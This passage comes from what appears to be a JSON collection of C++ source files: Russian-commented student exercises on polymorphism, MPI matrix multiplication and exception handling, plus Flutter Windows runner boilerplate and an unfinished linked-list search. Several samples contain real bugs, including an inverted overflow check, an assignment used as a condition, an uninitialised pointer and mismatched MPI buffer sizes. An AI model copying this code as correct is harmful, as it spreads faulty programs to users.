\u0431\u0430\u0437\u043e\u0432\u043e\u0433\u043e \u043a\u043b\u0430\u0441\u0441\u0430).\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u043f\u043e 1 \u043e\u0431\u044a\u0435\u043a\u0442\u0443 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0438\u0437 \u043a\u043b\u0430\u0441\u0441\u043e\u0432. \u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0432\u044b\u0437\u043e\u0432 \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0445 \u0444\u0443\u043d\u043a\u0446\u0438\u0439.\n\u041f\u0440\u0438 \u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u0439 \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0438\u0442\u044c \u0438 \u043f\u0440\u043e\u0434\u0435\u043c\u043e\u043d\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0434\u0432\u0430 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430: \u0441\u0442\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u043f\u043e\u043b\u0438\u043c\u043e\u0440\u0444\u0438\u0437\u043c \u0438 \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u043f\u043e\u043b\u0438\u043c\u043e\u0440\u0444\u0438\u0437\u043c.*/\n\n#include <stdlib.h>\n#include <iostream>\nusing namespace std;\nclass Square // \u0411\u0430\u0437\u043e\u0432\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 - \"\u041a\u0432\u0430\u0434\u0440\u0430\u0442\"\n{\nprotected:\n    double l; // \u0414\u043b\u0438\u043d\u0430 \u0441\u0442\u043e\u0440\u043e\u043d\u044b\npublic:\n    Square(double l): l(l) {}  // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f\n\n    virtual double area() {\n        return l*l;\n    }\n    void print() {\n        cout << \"\\nSide = \" << l << \" Area = \" << l*l << \"\\n\";\n    }\n};\nclass Cube: public Square // \u041f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 - \"\u041a\u0443\u0431\"\n{\npublic:\n    Cube(double l): Square(l) {} // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\n    double area() override // \u041f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 area\n    {\n        return Square::area()*l;\n    }\n};\n\nint main(int argc, char* argv[])\n{\n    Square sq_static(12);\n    cout << sq_static.area() << \"\\n\";\n    Cube c_static(4);\n    cout << c_static.area() << \"\\n\";\n\n    Square* sq_dinamic = new Square(10);\n    cout << sq_dinamic->area() << \"\\n\";\n    Cube* c_dinamic = new Cube(7);\n    cout << c_dinamic->area() << \"\\n\";\n    system(\"pause\"); // \u041e\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443 \u0434\u043e \u043d\u0430\u0436\u0430\u0442\u0438\u044f \u043b\u044e\u0431\u043e\u0439 \u043a\u043b\u0430\u0432\u0438\u0448\u0438\n    return 0;\n}\n",
    "\ufeff#include <iostream>\r\n#include <random>\r\n#include \"mpi.h\"\r\n#include <chrono>\r\n\r\n#define N 4 // \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u0430 N \u0434\u043b\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u043d\u043e\u0441\u0442\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0445 \u043c\u0430\u0442\u0440\u0438\u0446\r\n\r\nusing namespace std;\r\n\r\nvoid print_matrix(int m[N][N], string name) {\r\n    cout << name << \" = \" << endl;\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            cout << \" \" << m[i][j] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n    int rank, numtasks;\r\n    MPI_Init(&argc, &argv);\r\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\r\n    MPI_Comm_size(MPI_COMM_WORLD, &numtasks);\r\n\r\n    // \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447 \u0447\u0438\u0441\u0435\u043b\r\n    random_device rd;\r\n    mt19937 gen(rd() + rank);\r\n    uniform_int_distribution<int> dis(1, 1000);\r\n\r\n    int a[N][N];\r\n    int b[N][N];\r\n    int c[N][N];\r\n    int aa[N], cc[N];\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    // \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u0441\u043b\u0443\u0447 \u0447\u0438\u0441\u043b\u0430\u043c\u0438\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            a[i][j] = dis(gen);\r\n            b[i][j] = dis(gen);\r\n        }\r\n    }\r\n\r\n    MPI_Scatter(a, N * N / numtasks, MPI_INT, aa, N * N / numtasks, MPI_INT, 0, MPI_COMM_WORLD);\r\n    MPI_Bcast(b, N * N, MPI_INT, 0, MPI_COMM_WORLD);\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    auto start = chrono::steady_clock::now();\r\n\r\n    //\u043f\u0435\u0440\u0435\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u043c\u0430\u0442\u0440\u0438\u0446\r\n    int sum = 0;\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            sum += aa[j] * b[j][i];\r\n        }\r\n        cc[i] = sum;\r\n        sum = 0;\r\n    }\r\n\r\n    MPI_Gather(cc, N * N / numtasks, MPI_INT, c, N * N / numtasks, MPI_INT, 0, MPI_COMM_WORLD);\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    auto end = chrono::steady_clock::now();\r\n    if (rank == 0) {\r\n        auto duration = chrono::duration_cast<chrono::duration<double>>(end - start);\r\n        cout << \"time:  \" << duration.count() << \" seconds\" << endl;\r\n        print_matrix(a, \"A\");\r\n        print_matrix(b, \"B\");\r\n        print_matrix(c, \"C\");\r\n    }\r\n\r\n    MPI_Finalize();\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include<iostream>\n#include<stdlib.h>\n#include<exception>\n#include<time.h>\n#include<limits>\n\n/* \u041e\u0411\u0420\u0410\u0411\u041e\u0422\u041a\u0410 \u0418\u0421\u041a\u041b\u042e\u0427\u0415\u041d\u0418\u0419\n*\t- \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0438\n*\t- \u0441\u043f\u043e\u0441\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0439 \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t- \u0432\u0441\u0442\u0440\u043e\u0435\u043d\u043d\u044b\u0435 \u0432 \u044f\u0437\u044b\u043a \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n*\t- \u0442\u0438\u043f\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t- \u0440\u0435\u043a\u043e\u043c\u0435\u043d\u0434\u0430\u0446\u0438\u0438 \u043f\u043e \u0432\u0437\u0430\u0438\u043c\u043e\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044e \u0441 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\u043c\u0438 \u0432 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435\n* \u041a\u043b\u044e\u0447\u0435\u0432\u044b\u0435 \u0441\u043b\u043e\u0432\u0430 \u044f\u0437\u044b\u043a\u0430\n* \n* throw try catch\n* \n* try-\u0431\u043b\u043e\u043a \u043c\u043e\u0436\u0435\u0442 \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u044c \u0432 catch \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0448\u0438\u0431\u043a\u0438,\n* \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435 \u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b/\n* \n* \u0414\u043b\u044f \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0445 \u043e\u0448\u0438\u0431\u043e\u043a \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044f catch(...)\n* \n* \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f \u043e\u0448\u0438\u0431\u043e\u043a \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u044b runtime_error \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\n* \u0431\u044b\u0442\u044c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u0430 \u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\u0438 \u0435\u0451 \u043d\u0430\u0434\u043e \u043f\u0440\u0435\u0434\u043e\u0442\u0432\u0440\u0430\u0449\u0430\u0442\u044c\n* \n* \u041f\u0440\u0430\u0432\u0438\u043b\u0430 \u043f\u043e \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u044e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439 \u0432 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443\n* 1. \u041d\u0435 \u043e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u043f\u043e \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430\u043c, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u043c\u044b \u043d\u0435 \u0432\u043b\u0430\u0434\u0435\u0435\u043c\n*    \u041d\u0435 \u043e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0438\u0441\u043a\u043b., \u0435\u0441\u043b\u0438 \u043c\u044b \u0438\u0445 \u043d\u0435 \u043f\u043e\u0440\u043e\u0434\u0438\u043b\u0438. \u0412 \u044d\u0442\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435 \n*    \u0438\u0441\u043f. \u0442\u043e\u043b\u044c\u043a\u043e throw-\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044f \u0441 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435\u043c, \u0447\u0442\u043e \u043f\u043e\u0448\u043b\u043e \u043d\u0435 \u0442\u0430\u043a\n* 2. try-catch \u0438\u0441\u043f. \u0442\u043e\u043b\u044c\u043a\u043e \u0432 \u043a\u043e\u0434\u0435, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u0443\u0432\u0435\u0440\u0435\u043d, \u0447\u0442\u043e \u0435\u0433\u043e \u0434\u0430\u043d\u043d\u044b\u0435\n*    \u043c\u043e\u0433\u0443\u0442 \u0431\u044b\u0442\u044c \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b \u0432\u043d\u0435\u0448\u043d\u0438\u043c \u043a\u043e\u0434\u043e\u043c\n* 3. \u041d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0431\u0430\u0437\u043e\u0432\u044b\u0435 \u0442\u0438\u043f\u044b \u0434\u043b\u044f \u043b\u043e\u0432\u043b\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*    \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 <exception>, \u043b\u0438\u0431\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t \u0411\u0430\u0437\u043e\u0432\u044b\u0435 \u0442\u0438\u043f\u044b \u0432 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\u0445 \u0431\u0443\u0434\u0443\u0442 \u0437\u0430\u0441\u0442\u0430\u0432\u043b\u044f\u0442\u044c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043b\u0438\u0441\u0442\u0430\u0442\u044c \n\t \"\u0442\u043e\u043b\u043c\u0443\u0434\u044b\", \u0447\u0442\u043e\u0431\u044b \u0443\u0437\u043d\u0430\u0442\u044c, \u0447\u0442\u043e \u0442\u043e\u0442 \u0438\u043b\u0438 \u0438\u043d\u043e\u0439 \u043a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u0437\u043d\u0430\u0447\u0430\u0435\u0442\n\n\t\u0422\u0438\u043f\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439:\n\t1. runtime_error - \u0436\u0438\u0432\u0443\u0442 \u0432 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u043e\u043d\u043a\u0435 \u0438 \u043d\u0435 \u043c\u043e\u0433\u0443\u0442 \u0431\u044b\u0442\u044c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b\n\t2. \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u043d\u044b\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f:\n\t\t2.1 logic_exception\n\t\t\tinvalid_argument (\u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b: \u043e\u0448\u0438\u0431\u043e\u0447\u043d\u044b\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b \u0444.)\n\t\t\tdamain_error (\u0434\u043e\u043c\u0435\u043d\u043d\u0430\u044f \u043e\u0448\u0438\u0431\u043a\u0430: \u0438\u0433\u0440\u043e\u0432\u0430\u044f \u0438\u043b\u0438 \u0431\u0438\u0437\u043d\u0435\u0441 \u043b\u043e\u0433\u0438\u043a\u0430)\n\t\t\tlength_error (\u043e\u0448\u0438\u0431\u043a\u0438 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u043d\u0438\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438)\n\t\t\tout_of_range (\u0432\u044b\u0445\u043e\u0434 \u0437\u0430 \u043f\u0440\u0435\u0434\u0435\u043b\u044b \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430)\n\t\t2.2 runtime_error (\u043e\u0448\u0438\u0431\u043a\u0438 \u0432\u043d\u0443\u0442\u0440\u0438 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a, \u0441\u043b\u043e\u043c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u043e\u043c \u0443\u0440\u043e\u0432\u043d\u0435)\n\t\t\trange_error (\u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438 \u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u043e\u043c \u0443\u0440\u043e\u0432\u043d\u0435)\n\t\t\toverflow_error (\u043e\u0448\u0438\u0431\u043a\u0430 \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0442\u0438\u043f\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u0440\u0438 \u0434\u043e\u0441\u0442\u0438\u0436\u0435\u043d\u0438\u0438 \u043f\u0440\u0435\u0434\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0442\u0438\u043f\u0430 \u0434\u0430\u043d\u043d\u044b\u0445)\n\t\t\tunderflow_error (\u0435\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043f\u044b\u0442\u0430\u0435\u0442\u0441\u044f \u043f\u0440\u0435\u043e\u0434\u043e\u043b\u0435\u0442\u044c \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435)\n\t\t\tregex_error \n\t\t\tsystem_error (\u043f\u043e \u043c\u0430\u0441\u043a\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0449\u0443\u0442 \u0432\u0445\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u0432 \u0434\u0440\u0443\u0433\u043e\u043c \u043c\u0435\u0441\u0442\u0435)\n\t\t2.3 bad_typeid - \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u043d\u0438\u044f \u0442\u0438\u043f\u043e\u0432\n\t\t2.4 bad_cast\n\t\t2.5 bad_alloc\n\t\t2.6 bad_exception - \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u0430 \u043f\u0440\u0438 \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n\n   int Summ2(int a, int b) noexcept {}, noexcept \u043f\u0438\u0448\u0435\u0442\u0441\u044f, \u043a\u043e\u0433\u0434\u0430 \u043a\u043e\u043c\u043f\u0438\u043b\u044f\u0442\u043e\u0440 \u0434\u043e\u043b\u0436\u0435\u043d \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n*/\n\nvoid F00(int a) {\n\tif (a){\n\t\tthrow std::exception(\"Bad luck\");\n\t}\n}\n\nvoid F01(int a) {\n\tif (a) {\n\t\t// \u041d\u0438\u0437\u043a\u043e\u0443\u0440\u043e\u0432\u043d\u0435\u0432\u044b\u0439 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439, \u043f\u043e\u043a\u0430 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043d\u0435 \u0431\u0443\u0434\u0435\u043c\n\t\t//throw std::make_exception_ptr(std::exception(\"Bad luck\"));\n\t\tthrow std::exception(\"Bad luck\");\n\t}\n}\n\nint Summ(int a, int b) {\n\tif (std::numeric_limits<int>::max() - b > a) {\n\t\tthrow std::overflow_error(\"more then return can handle\");\n\t}\n\treturn a + b;\n}\n\nint main() {\n\t// \u0411\u043b\u043e\u043a \u043a\u043e\u0434\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043c\u043e\u0436\u0435\u0442 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\n\t//try {\n\t//\tint a{ 5 }, b{ 0 };\n\t//\tint c{};\n\t//\tif (!b) throw -1; // \u0421\u043e\u0431\u044b\u0442\u0438\u0435, \u0432\u044b\u0437\u044b\u0432\u0430\u044e\u0449\u0435\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u0443\u044e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u044e\n\t//\t// \u041a\u043e\u0434, \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0437\u0430 throw, \u0432 \u0441\u043b\u0443\u0447\u0430\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0439 \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f\n\t//\tc = a / b;\n\t//}\n\t//// \u0411\u043b\u043e\u043a, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043b\u043e\u0432\u0438\u0442 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\n\t//catch (int ex) {\n\t//\tif (ex == -1) {\n\t//\t\tprintf(\"devide by 0\\n\");\n\t//\t}\n\t//}\n\t//// \u041b\u044e\u0431\u044b\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043a\u0438\u0434\u0430\u044e\u0442\u0441\u044f \u0438\u0437\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b, \u0435\u0441\u043b\u0438 \u043e\u043d\u0438 \u043d\u0435 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b cathc-\u0431\u043b\u043e\u043a\u0430\u043c\u0438\n\t//catch (...) { \n\t//\tprintf(\"Something go wrong\\n\");\n\t//}\n\n\t::srand(::time(NULL));\n\ttry {\n\t\tint i{};\n\t\ti = rand() % 2;\n\t\t//F00(i);\n\t\tSumm(2e30, 4e31);\n\t}\n\tcatch (std::exception& ex) {\n\t\tstd::cerr << ex.what() << '\\n'; // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u0441\u043e\u043f\u0440\u043e\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0442\u0435\u043a\u0441\u0442\u0430, \u043d\u0430\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e\u0441\u044f \u0432 \u043a\u043b\u0430\u0441\u0441\u0430 \u043e\u0448\u0438\u0431\u043a\u0438\n\t}\n\t// \u0423\u043d\u0438\u0432\u0435\u0440\u0441\u0430\u043b\u044c\u043d\u044b\u0439 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439 \u043f\u0438\u0448\u0435\u043c \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u043c \u0434\u043b\u044f \u043e\u0442\u043e\u043b\u043e\u0432\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u043d\u0435 \u043f\u043e\u0439\u043c\u0430\u043b\u0438 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0438\u0435 catch\n\tcatch (...) { \n\t\tprintf(\"Something go wrong\\n\");\n\t}\n\n\treturn 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\nstruct node\r\n{\r\n    int data;\r\n    struct node*next\r\n};\r\nstruct node*head=NULL;\r\nstruct node*tail=NULL;\r\nvoid search()\r\n{   \r\n    struct node*temp;\r\n    int key,flag=1,count=1;\r\n    cout<<\"Enter a key to search in array - \";\r\n    cin>>key;\r\n    while(temp!=NULL)\r\n    {\r\n        if(key==temp->data)\r\n        {\r\n            flag=0;\r\n            break;\r\n        }\r\n        count++;\r\n        temp=temp->next;\r\n    }\r\n    if(flag=0)\r\n    {\r\n        cout<<\"is present at position \"<<count<<endl;\r\n    }\r\n    else\r\n    {\r\n        cout<<\"is not present\"<<endl;\r\n    }\r\n}\r\nint main()\r\n{\r\nint choice;\r\nint arr[]={0,5,2,6,3,6,4};\r\ncout<<\"Enter 1 for search in the 